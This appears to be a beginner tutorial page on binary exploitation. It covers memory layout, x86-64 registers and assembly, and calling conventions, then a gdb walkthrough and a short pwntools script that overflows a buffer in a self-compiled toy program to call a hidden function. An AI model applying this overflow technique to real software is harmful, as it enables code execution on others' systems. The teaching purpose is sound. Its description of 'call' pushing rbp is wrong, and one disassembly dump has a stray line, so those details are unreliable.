---
layout: page
title: Binary Exploitation
comments: true
tags: [pwn]
---

### Introduction
Binary exploitation is all about finding vulnerabilities in compiled binaries (for example, ELF files in linux and exe files in windows) and exploiting them to achieve arbitrary code execution. 

### Memory Layout of Compiled Programs

We need to understand the memory layout of binaries before diving into the fundamentals of binary exploitation.

<img src='/images/pwn/pwn_01.png'/>

A typical memory representation of a C program consists of the following sections:
- .text
- .data
- .bss
- Stack
- Heap

<hr>

`.bss` -> The bss segment stores all uninitialized global and static variables. All such uninitialized variables are initialized to zero at load time, by the loader.

`.data` -> This section stores all initialized global and static variables.

`.text` -> text segment (also known as the code segment) contains machine code of the compiled program.

`Heap` -> Heap is responsible for dynamic memory allocation. Each process gets its own heap. The heap grows from a region of lower memory addresses to a region of higher memory addresses.
```cpp
// Dynamic memory allocation
char* buffer = (char*)malloc(100);
int* var = new int;
```

`Stack` -> This is the place where local variables and function calls are stored. The stack grows from a region of higher memory address to a region of lower memory address.

<hr>

## Subroutines
A subroutine is a sequence of program instructions that perform a specific task. It is just an old programmer speak for either a function or a procedure, i.e., a generic term for a named bit of code.

## Call Stack and Stack Frames
A call stack is a stack data structure that stores information about the active subroutines of a program. This kind of stack is also known as a program stack, machine stack, execution stack or run-time stack. Its purpose is to control the way functions call and pass parameters to each other.

Whenever a function is called, a stack frame (activation record) is created which stores the local variables, function arguments and the return address. Stack frames are pushed into the call stack whenever a function is called, and popped from the call stack when the function execution completes. `First of all, the function parameters are pushed onto the stack, depending on the calling convention. After that, the return address is pushed onto the stack followed by the saved rbp and local variables.`



## Registers
A register is a quickly accessible location accessible to a computer's processor. Registers usually contain a small amount of fast storage, although some registers have special hardware functions. Let's have a look on some x64 registers.

`rbp`(Base pointer) -> Points to the bottom of the current stack frame.

`rsp`(Stack pointer) -> Points to the top of the current stack frame.

`rip`(Instruction pointer) -> Also known as program counter, it stores the memory address of the next instruction to be executed.

The registers mentioned above are used for special purposes and are sometimes referred to as special purpose registers. Apart from that, there are a few general purpose registers -> rax,rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11, r12, r13, r14 and r15. There are different sizes for registers.

```
+-----------------+---------------+---------------+------------+
| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |
+-----------------+---------------+---------------+------------+
|   rbp           |     ebp       |     bp        |     bpl    |
|   rsp           |     esp       |     sp        |     spl    |
|   rip           |     eip       |               |            |
|   rax           |     eax       |     ax        |     al     |
|   rbx           |     ebx       |     bx        |     bl     |
|   rcx           |     ecx       |     cx        |     cl     |
|   rdx           |     edx       |     dx        |     dl     |
|   rsi           |     esi       |     si        |     sil    |
|   rdi           |     edi       |     di        |     dil    |
|   r8            |     r8d       |     r8w       |     r8b    |
|   r9            |     r9d       |     r9w       |     r9b    |
|   r10           |     r10d      |     r10w      |     r10b   |
|   r11           |     r11d      |     r11w      |     r11b   |
|   r12           |     r12d      |     r12w      |     r12b   |
|   r13           |     r13d      |     r13w      |     r13b   |
|   r14           |     r14d      |     r14w      |     r14b   |
|   r15           |     r15d      |     r15w      |     r15b   |
+-----------------+---------------+---------------+------------+
```

<hr>

### Introduction to Assembly
Assembly is a low-level programming language that is intended to communicate directly with a computer's hardware. Unlike machine code, assembly is designed to be readable by humans. The syntax of assembly is different for different architectures such as ARM, x86-64, MIPS, RISC-V, etc. Let's have a look on some basic assembly instructions present in x86-64 architecture.

`add`

Adds the values specified by the first and the second operand and stores the sum in the first operand. For example:
```
add rax, rdx
```

`sub`

Subtracts the second operand from the first operand and stores the result in the first operand. For example:
```
sub rsp, 0x10
```

`push`

Pushes a value into the stack which grows its size by 8 bytes (in x64) and 4 bytes (in x86). For example:
```
push rax
```

`pop`

Pops the value stored on the top of the stack into the specified operand which reduces the size of the stack. For example:
```
pop rax
```

`jmp`

Used to redirect code execution. It causes the execution to jump to the specified address. For example:
```
jmp 0x40111e
```

`mov`

Copies data from the second operand into the first operand. For example,
```
mov rax,rdx
```
`call`

Pushes the value of rbp and rip onto the stack, then jumps to the provided address. It is used for calling functions. For example,
```
call 0x401106
```

`square brackets`
```
mov QWORD PTR [rbp-0x8],rdi
```
Square brackets are used to dereference a pointer. This is similar to `*(rbp-0x8)=rdi`, in C/C++.

`ret`

Pops the return address off the stack and continues execution at that address.

<hr>

## Calling Convention
A calling convention specifies the way arguments are passed to a function.

### cdecl
In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order.

### SysV
For 64-bit binaries, the first 6 arguments are passed into rdi, rsi, rdx, rcx, r8 and r9 registers respectively. Remaining arguments are pushed onto the stack in reverse order. The return value is stored in the rax register.

There are other calling conventions as well, such as stdcall, fastcall, etc.

Consider a simple function, which is a part of a C program (assuming SysV calling convention)
```
size_t func(size_t arg1, size_t arg2){
    return arg1+arg2;
}
```
Let's load the program in gdb and dissassemble `func`
```py
pwndbg> disassemble func
Dump of assembler code for function func:
   0x0000000000401106 <+0>:	    endbr64 
   0x000000000040110a <+4>:	    push   rbp
   0x000000000040110b <+5>:	    mov    rbp,rsp
   0x000000000040110e <+8>:	    mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401112 <+12>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401116 <+16>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040111a <+20>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040111e <+24>:	add    rax,rdx
   0x0000000000401121 <+27>:	pop    rbp
   0x0000000000401122 <+28>:	ret
```

The `add rax,rdx` adds the values and stores the result in the `rax` register, which is the return value (read the disassembly carefully to find out how the function arguments are passed into rdx and rax respecively).

### Buffer Overflow
A buffer overflow occurs when a program attempts to put more data in a buffer than it can hold. The extra data overflows into the adjacent storage and overwrites the data already present there.

<img src='/images/pwn/pwn_02.png'>
Consider a simple C++ program
```cpp
#include<iostream>

char overflowme[48] = {'a'};

unsigned long modifyMe = 0xdeadbeef;

int main(){
	std::cin>>overflowme;
    return 0;
}


```
Let's compile this program using `g++ prog.cpp -o prog -fno-stack-protector -no-pie` and load the binary in gdb.
```
gdb ./prog 

```
I'm using [pwndbg](https://github.com/pwndbg/pwndbg), which is a python module that automatically loads into gdb and provides multiple debugging commands.
```
pwndbg> x/20gx &overflowme
0x404060 <overflowme>:	0x0000000000000061	0x0000000000000000
0x404070 <overflowme+16>:	0x0000000000000000	0x0000000000000000
0x404080 <overflowme+32>:	0x0000000000000000	0x0000000000000000
0x404090 <modifyMe>:	0x00000000deadbeef
```
In this case, there's a buffer overflow bug because `std::cin` doesn't validate the size of user input. Let's set a breakpoint on `0x0000000000401196` and send 56 bytes using std::cin
```
pwndbg> b *0x0000000000401196
pwndbg> r
Starting program: /tmp/prog 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb
```

```
pwndbg> x/20gx &overflowme
0x404060 <overflowme>:	0x6161616161616161	0x6161616161616161
0x404070 <overflowme+16>:	0x6161616161616161	0x6161616161616161
0x404080 <overflowme+32>:	0x6161616161616161	0x6161616161616161
0x404090 <modifyMe>:	0x6262626262626262	0x0000000000000000
```
So, we've successfully changed the value of the variable `modifyMe`, which was initially `0xdeadbeef`. 

### Code execution using buffer overflow
Now let's try some interesting stuff, overwriting variables isn't fun, right?

```cpp
#include<iostream>

void callme(){
	puts("How did you do that?");
}

int main(){
	char overflowme[48];
	printf("%p\n",overflowme);
	std::cin>>overflowme;
    return 0;
}


```
Let's compile this program using `g++ prog.cpp -o prog -fno-stack-protector -no-pie` and load it in gdb. 
pwndbg supports `pwnlib`'s `cyclic` command which can be used to generate a cyclic pattern. Let's generate a pattern of size 100 bytes.
```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Let's set a breakpoint before `std::cin` to examine the state of the stack before reading the user input.
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004011cd <+0>:	endbr64 
   0x00000000004011d1 <+4>:	push   rbp
   0x00000000004011d2 <+5>:	mov    rbp,rsp
   0x00000000004011d5 <+8>:	sub    rsp,0x30
   0x00000000004011d9 <+12>:	lea    rax,[rbp-0x30]
   0x00000000004011dd <+16>:	mov    rsi,rax
   0x00000000004011e0 <+19>:	lea    rdi,[rip+0xe33]        # 0x40201a
   0x00000000004011e7 <+26>:	mov    eax,0x0
   0x00000000004011ec <+31>:	call   0x401080 <printf@plt>
   0x00000000004011f1 <+36>:	lea    rax,[rbp-0x30]
   0x00000000004011f5 <+40>:	mov    rsi,rax
   0x00000000004011f8 <+43>:	lea    rdi,[rip+0x2e61]        # 0x404060 <_ZSt3cin@@GLIBCXX_3.4>
   0x00000000004011ff <+50>:	call   0x401090 <_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@plt>
   0x0000000000401204 <+55>:	mov    eax,0x0
   0x0000000000401209 <+60>:	leave  
   0x000000000040120a <+61>:	ret  
   0x00000000004011d2 <+37>:	ret    
End of assembler dump.

pwndbg> b *0x00000000004011f5
Breakpoint 1 at 0x4011f5

pwndbg> r
Starting program: /tmp/prog 
0x7fffffffdda0

```
Here, `0x7fffffffdda0` is the address of the `overflowme` buffer. Since, stack pointer points to the top of the current stack frame, we can dump some data around it to view what's actually present in the stack. Please note that `0x7fffffffdda0` is a stack address, which might be different in different instances of the program due to ASLR (Address Space Layout Randomization).

```
pwndbg> x/10gx $rsp
0x7fffffffdda0:	0x00007ffff7dcd2e8	0x0000000000401280
0x7fffffffddb0:	0x0000000000000000	0x00000000004010d0
0x7fffffffddc0:	0x00007fffffffdec0	0x0000000000000000
0x7fffffffddd0:	0x0000000000000000	0x00007ffff7c00083
0x7fffffffdde0:	0x00007ffff7dc8b80	0x00007fffffffdec8
```
Here, the calling convention is `SysV`, so the first 6 function arguments will be passed into registers (they will not be pushed onto the stack). In this case, the return address will be pushed into the stack, followed by saved rbp (the push rbp instruction present at the starting of a function), followed by local variables. We also know that the stack grows from higher memory addresses to lower memory addresses.
```
pwndbg> p/x $rbp
$1 = 0x7fffffffddd0
```
The return address is stored at the location 8 bytes after the pointer stored at rbp i.e at `0x7fffffffddd8`. The current return address is `0x00007ffff7c00083` which means that the program will jump to `0x00007ffff7c00083` after executing the current function. We can call any arbitrary function if me manage to overwrite the return address with the address of the function we wanna call.
```
pwndbg> p &callme
$2 = (<text variable, no debug info> *) 0x4011b6 <callme()>

```
The address of the function `callme` is 0x4011b6 which means that we can call the function `callme` if we somehow write the value `0x4011b6` at the address `0x7fffffffddd8`. In this case, sending 56 bytes of junk data followed by the address of `callme` will do the job. We can use `pwntools` to write the exploit.

```
#!/usr/bin/env python3

from pwn import *
p = process("./prog")
payload = b'a'*56 + p64(0x4011b6)
p.recvline()
p.sendline(payload)
p.interactive()

```
<img src='/images/pwn/pwn_03.png'>

Awesome, we successfully called the function `callme` by exploiting a buffer overflow.

References
[https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

<br>
[https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

<br>
[https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io/)

<br>
[https://ctf101.org/](https://ctf101.org/)